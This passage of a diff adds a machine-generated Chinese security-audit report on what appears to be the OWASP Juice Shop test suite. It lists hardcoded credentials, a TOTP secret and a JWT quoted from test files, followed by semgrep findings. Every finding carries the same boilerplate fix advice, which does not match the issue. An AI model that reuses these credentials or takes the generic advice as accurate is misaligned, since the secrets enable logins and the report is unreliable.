+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.174 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:128　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.175 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:140　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.176 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:152　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.177 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:166　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.178 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:180　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.179 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:193　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.180 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:207　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.181 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:219　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.182 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:231　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.183 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user-profile.test.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;jim@juice-sh.op&#39;, password: &#39;ncc-1701&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.184 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:52　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;hooooorst&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.185 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:68　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;hooooorst&#39;,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.186 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:136　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;hooooorst&#39;,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.187 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:154　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;hooooorst&#39;,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.188 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:172　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;hooooorst&#39;,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.189 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:189　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;does.not.matter&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.190 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:240　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.191 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:289　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.192 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:304　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.193 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/user.test.ts:318　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.194 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/wallet.test.ts:81　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>.send({ email, password: &#39;password&#39;, passwordRepeat: &#39;password&#39;, securityQuestion: { id: 1 }, securityAnswer: &#39;answer&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.195 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/wallet.test.ts:86　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>.send({ email, password: &#39;password&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.196 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/administration.spec.ts:5　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.197 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/b2bOrder.spec.ts:6　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.198 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/b2bOrder.spec.ts:37　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.199 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/basket.spec.ts:4　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.200 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/basket.spec.ts:76　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;jim&#39;, password: &#39;ncc-1701&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.201 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/changePassword.spec.ts:6　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;focusOnScienceMorty!focusOnScience&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.202 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/changePassword.spec.ts:25　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;OhG0dPlease1nsertLiquor!&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.203 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/changePassword.spec.ts:31　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;bender&#39;, password: &#39;slurmCl4ssic&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.204 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/chatbot.spec.ts:8　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.205 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/complain.spec.ts:5　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.206 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/contact.spec.ts:11　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.207 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/contact.spec.ts:47　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.208 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/dataErasure.spec.ts:3　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.209 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/dataExport.spec.ts:24　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admun&#39;, password: &#39;admun123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.210 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/deluxe.spec.ts:4　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;jim&#39;, password: &#39;ncc-1701&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.211 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/deluxe.spec.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.212 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/noSql.spec.ts:8　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.213 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/noSql.spec.ts:53　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.214 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/noSql.spec.ts:76　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;mc.safesearch&#39;, password: &#39;Mr. N00dles&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.215 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/noSql.spec.ts:120　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;mc.safesearch&#39;, password: &#39;Mr. N00dles&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.216 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/passwordHashLeak.spec.ts:3　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin@juice-sh.op&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.217 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/profile.spec.ts:3　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.218 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/register.spec.ts:10　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.219 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/register.spec.ts:84　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ThereCanBeOnlyOne&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.220 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/restApi.spec.ts:4　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>cy.login({ email: &#39;admin&#39;, password: &#39;admin123&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.221 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/restApi.spec.ts:82　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.222 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/search.spec.ts:56　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.223 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/search.spec.ts:83　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.224 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/totpSetup.spec.ts:6　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;EinBelegtesBrotMitSchinkenSCHINKEN!&#39;,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.225 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/totpSetup.spec.ts:7　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>totpSecret: &#39;IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.226 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/cypress/e2e/totpSetup.spec.ts:20　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;K1f.....................&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.227 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/server/currentUser.unit.test.ts:31　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>req.cookies.token = &#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmcifSwiaWF0IjoxNT</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.228 github-actions-mutable-action-tag <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\ci.yml:188　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.229 github-actions-mutable-action-tag <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\codeql-analysis.yml:23　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.230 github-actions-mutable-action-tag <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\codeql-analysis.yml:34　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.231 github-actions-mutable-action-tag <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\codeql-analysis.yml:36　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.232 github-actions-mutable-action-tag <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\image_actions.yml:30　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.233 github-actions-mutable-action-tag <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\image_actions.yml:33　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.234 github-actions-mutable-action-tag <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\image_actions.yml:42　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.235 npm-missing-minimum-release-age <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.npmrc:1　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.236 npm-missing-minimum-release-age <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\.npmrc:1　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.237 prototype-pollution-loop <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\src\hacking-instructor\helpers\helpers.ts:49　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.238 detect-non-literal-regexp <span class="badge medium">MEDIUM</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\lib\codingChallenges.ts:76　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
